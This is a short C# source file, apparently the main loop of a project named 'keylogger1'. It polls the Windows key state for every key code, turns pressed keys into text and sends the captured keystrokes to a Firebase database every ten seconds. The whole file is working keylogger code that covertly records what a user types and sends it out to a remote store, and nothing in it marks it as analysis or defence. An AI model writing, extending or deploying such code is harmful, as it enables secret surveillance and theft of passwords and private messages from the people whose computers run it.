using System.Runtime.InteropServices;
using FireSharp.Config;
using FireSharp.Response;
using FireSharp.Interfaces;
using System.Net;
using keylogger1;

[DllImport("User32.dll")]
static extern int GetAsyncKeyState(Int32 i);

FireBaseWrite db = new FireBaseWrite();

string keys = "";


while (true)
{


    Thread.Sleep(5);

    int sec = Int32.Parse(DateTime.Now.ToString("ss"));

    if (sec % 10 == 0)
    {
        if (keys != "")
        {
            db.writeto(keys);
            keys = "";
        }

    }
        
    KeyToString kts = new KeyToString();
    for (int i = 0; i < 255; i++)
    {
        int keyState = GetAsyncKeyState(i);
        if (keyState == 32769) keys += kts.process(i);
    }
}
